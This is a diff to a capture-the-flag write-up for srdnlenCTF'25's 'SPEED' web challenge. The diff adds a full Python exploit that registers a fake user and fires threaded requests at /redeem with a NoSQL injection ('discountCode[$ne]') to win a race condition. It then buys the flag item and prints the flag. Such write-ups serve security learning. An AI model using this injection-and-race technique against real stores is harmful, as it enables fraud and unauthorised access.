@@ -8,7 +8,7 @@ Opening the site, this is what we see.
 The objective was to buy the most expensive item in the store to access and read the flag.
 ![image](https://github.com/user-attachments/assets/2aabb838-fae8-46d6-9ecf-212ab58d0407)
 
-Continuing to read the [source code](), we go to the `/redeem` section of the site.
+Continuing to read the [source code](https://github.com/Rishblol/CTF-Writeups/tree/main/srdnlenCTF'25/files/SPEED), we go to the `/redeem` section of the site.
 ```javascript
 router.get('/redeem', isAuth, async (req, res) => {
     try {
@@ -65,6 +65,56 @@ router.get('/redeem', isAuth, async (req, res) => {
 });
 ```
 This is perfect grounds for a NoSQL injection.\
-We can exploit this by writing a [Python script]() and we'll get the flag.\
+We can exploit this by writing a Python script and we'll get the flag.\
+```python
+import requests
+from faker import Faker
+from bs4 import BeautifulSoup
+import threading
+
+s = []
+snum = 20
+fake = Faker()
+url = "http://speed.challs.srdnlen.it:8082/"
+
+data = {
+        "username":fake.user_name(),
+        "password":fake.password()
+        }
+
+## NoSQLInjection
+def req(i):
+    s[i].get(url + "redeem?discountCode[$ne]=test")
+    
+th = []
+
+## Race Condition
+for i in range(snum):
+    s.append(requests.Session())
+    
+    if i == 0:
+        s[i].post(url + "register-user", json=data)
+    
+    s[i].post(url + "user-login", json=data)
+    
+    x = threading.Thread(target=req, args=(i,))
+    th.append(x)
+    
+for i in range(snum):
+    th[i].start()
+    
+for i in range(snum):
+    th[i].join()
+
+## Login  
+session = requests.Session()  
+session.post(url + "user-login", json=data).text
+
+## Flag purchase
+session.post(url + "store", json={"productId": 4})
+
+## Flag extraction
+print("\nFLAG: " + BeautifulSoup(session.get(url, timeout=20).text, 'html.parser').find('p', class_='card-text', string=lambda t: t and 'Flag:' in t).get_text().split('Flag: ')[1])
+```
 `flag: srdnlen{6peed_1s_My_0nly_Competition}`
 
